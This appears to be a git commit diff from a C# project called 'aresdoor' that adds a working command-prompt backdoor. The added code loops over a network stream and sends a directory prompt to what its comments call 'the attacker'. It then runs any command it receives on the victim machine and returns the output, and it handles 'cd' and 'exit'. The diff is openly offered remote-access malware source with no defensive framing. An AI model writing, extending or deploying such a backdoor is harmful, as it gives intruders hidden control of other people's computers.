389d01b1b6c5b440d2b578a26e2f4d6a05eed9eb
Willy Fox <official.blackvikingpro@gmail.com>
2018-01-13 00:44:04 -0600

    completed command prompt backdoor with full support

--- aresdoor/BackdoorCollection.cs
+++ aresdoor/BackdoorCollection.cs
@@ -1,6 +1,7 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.Linq;
+using System.Net.Sockets;
 using System.Text;
 using System.Threading.Tasks;
 
@@ -8,12 +9,34 @@ namespace aresdoor
 {
     class BackdoorCollection
     {
-        public static bool CommandPromptBackdoor()
+        NetworkCommunication nc = new NetworkCommunication();
+
+        public bool CommandPromptBackdoor(NetworkStream stream)
         {
-            return true;
+            while (true)
+            {
+                // Send shellcode to attacker
+                nc.dataTravelTO(stream, System.IO.Directory.GetCurrentDirectory() + "> ");
+                // Recieve response from client application
+                string responseFromServer = nc.dataTravelFROM(stream);
+
+                if (responseFromServer.Contains("cd"))
+                    System.IO.Directory.SetCurrentDirectory(responseFromServer.Split(" ".ToCharArray())[1]);
+                else if (responseFromServer.Contains("exit"))
+                    return false;
+                else
+                    try { nc.dataTravelTO(stream, Misc.execCommandPrompt(responseFromServer)); } // Execute command and send output to attacker
+                #if DEBUG
+                    catch (Exception exc) { Console.WriteLine(exc); return false; }
+                #else
+                    catch (Exception) { nc.dataTravelTO(stream, "Command didn't execute."); return false; }
+                #endif
+            }
+
+            return false; // Should we ever get here, it's probably because of an error.
         }
 
-        public static bool PowershellBackdoor()
+        public bool PowershellBackdoor(NetworkStream stream)
         {
             return true;
         }
